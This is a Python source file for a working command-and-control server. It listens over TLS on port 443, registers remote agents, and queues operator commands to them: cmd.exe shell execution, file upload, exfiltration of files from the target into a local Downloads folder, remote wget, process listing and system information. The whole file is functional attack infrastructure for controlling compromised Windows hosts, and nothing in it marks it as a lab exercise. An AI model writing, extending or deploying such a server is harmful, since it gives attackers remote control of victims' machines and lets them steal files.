import socket
import json
import threading
import base64
import os
import ssl
from datetime import datetime

HOST = '0.0.0.0'
PORT = 443 # Default HTTPS Port
current_cmd = "none"
active = True
in_shell = False
c2_vars = {"LHOST": "10.254.130.247"}

os.makedirs("./Downloads", exist_ok=True)

def log(msg):
    prompt = "SHELL> " if in_shell else "C2> "
    print(f"\r[{datetime.now().strftime('%H:%M:%S')}] {msg}\n{prompt}", end="")

def show_help():
    print("""
    CD [dir]           - Change/Show directory
    DOWNLOAD [path]    - Download remote file to ./Downloads
    GETUID             - Get shell user ID
    GETWD / PWD        - Get working directory
    IFCONFIG           - Show network configuration
    KILL               - Stop script on the remote host
    PS                 - Show process list
    SET [name] [val]   - Set a variable (no args to view)
    UNSET [name]       - Unset a variable
    SHELL [cmd]        - Exec in cmd.exe. No args switches to SHELL context.
    SHUTDOWN           - Exit this CLI
    SYSINFO            - Show system information
    SLEEP [ms]         - Set/View client polling interval
    UPLOAD [local] [R] - Upload local file to Remote path
    WGET [url]         - Download file from url to target
    HELP               - Show this help
    """)

def console():
    global current_cmd, active, in_shell, c2_vars
    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Console Ready. Type 'HELP' for commands.")
    
    while active:
        try:
            prompt = "SHELL> " if in_shell else "C2> "
            val = input(prompt).strip()
            if not val: continue
            
            parts = val.split(" ", 1)
            cmd_root = parts[0].upper()

            if in_shell and cmd_root == "EXIT":
                in_shell = False
                print("[*] Exited SHELL context.")
                continue
            if in_shell:
                current_cmd = f"SHELL {val}"
                continue

            if cmd_root == 'SHUTDOWN':
                print("[*] Shutting down C2 server...")
                active = False
                break
            elif cmd_root == 'HELP': show_help()
            elif cmd_root == 'SET':
                if len(parts) > 1:
                    k, v = parts[1].split(" ", 1)
                    c2_vars[k.upper()] = v
                    print(f"[+] {k.upper()} => {v}")
                else: print(json.dumps(c2_vars, indent=2))
            elif cmd_root == 'UNSET':
                if len(parts) > 1: c2_vars.pop(parts[1].upper(), None)
            elif cmd_root == 'SHELL':
                if len(parts) > 1: current_cmd = val
                else: 
                    in_shell = True
                    print("[*] Entered SHELL context. Type 'exit' to return.")
            elif cmd_root == 'UPLOAD':
                if len(parts) > 1 and "LHOST" in c2_vars:
                    args = parts[1].split(" ", 1)
                    if len(args) == 2:
                        local_path, remote_path = args
                        try:
                            with open(local_path, "rb") as f:
                                b64_data = base64.b64encode(f.read()).decode('utf-8')
                            current_cmd = f"UPLOAD {remote_path} {b64_data}"
                            print(f"[*] Queued upload of {local_path} ({len(b64_data)} bytes) to {remote_path}")
                        except Exception as e: print(f"[!] File read error: {e}")
                    else: print("[!] Usage: UPLOAD [localpath] [remotepath]")
                else: print("[!] Usage error or LHOST not set.")
            else:
                current_cmd = val
                print(f"[*] Tasked: {val}")
        except (EOFError, KeyboardInterrupt):
            active = False
            break

def recv_full_http(conn):
    raw = b""
    while b"\r\n\r\n" not in raw:
        try:
            chunk = conn.recv(1024)
            if not chunk: return None
            raw += chunk
        except socket.timeout: return None
            
    headers, body = raw.split(b"\r\n\r\n", 1)
    
    content_length = 0
    for line in headers.decode('utf-8', errors='ignore').split('\r\n'):
        if line.lower().startswith('content-length:'):
            content_length = int(line.split(':')[1].strip())
            
    while len(body) < content_length:
        try:
            chunk = conn.recv(8192)
            if not chunk: break
            body += chunk
        except socket.timeout: break
            
    return body.decode('utf-8', errors='ignore')

def run_server():
    global current_cmd, active
    
    # 1. Initialize SSL Context
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    
    # 2. Wrap the listening socket in SSL
    secure_socket = context.wrap_socket(s, server_side=True)
    secure_socket.settimeout(1.0) 
    
    print(f"[*] HTTPS Server listening on {HOST}:{PORT}")
    threading.Thread(target=console, daemon=True).start()

    while active:
        try:
            conn, addr = secure_socket.accept()
            conn.settimeout(5.0) 
            
            body_text = recv_full_http(conn)
            if body_text:
                try:
                    data = json.loads(body_text)
                    status = data.get('status')
                    raw_b64 = data.get('data', '')
                    raw_b64 += "=" * ((4 - len(raw_b64) % 4) % 4)
                    decoded_str = base64.b64decode(raw_b64).decode('utf-8', errors='ignore')
                    
                    if status == 'init':
                        log(f"NEW AGENT: {decoded_str} ({addr[0]})")
                    elif status == 'output':
                        if decoded_str.startswith("|DL|"):
                            parts = decoded_str.split("|::|", 1)
                            filename = os.path.basename(parts[0].replace("|DL|", "").strip())
                            file_data = base64.b64decode(parts[1])
                            save_path = f"./Downloads/{filename}"
                            with open(save_path, "wb") as f: f.write(file_data)
                            log(f"[+] Download complete: Saved to {save_path}")
                        else:
                            log(f"RESULT:\n{decoded_str}\n")

                    resp_json = json.dumps({"command": current_cmd})
                    current_cmd = "none" 
                    conn.sendall(f"HTTP/1.1 200 OK\r\nContent-Length: {len(resp_json)}\r\n\r\n{resp_json}".encode())
                except Exception as e:
                    log(f"Parse Error: {e}")
            conn.close()
        except socket.timeout: continue
        except ssl.SSLError: pass # Ignore random non-SSL pings (like network scanners)
        except Exception as e:
            if active: log(f"Server Error: {e}")
            break
            
    secure_socket.close()

if __name__ == "__main__":
    run_server()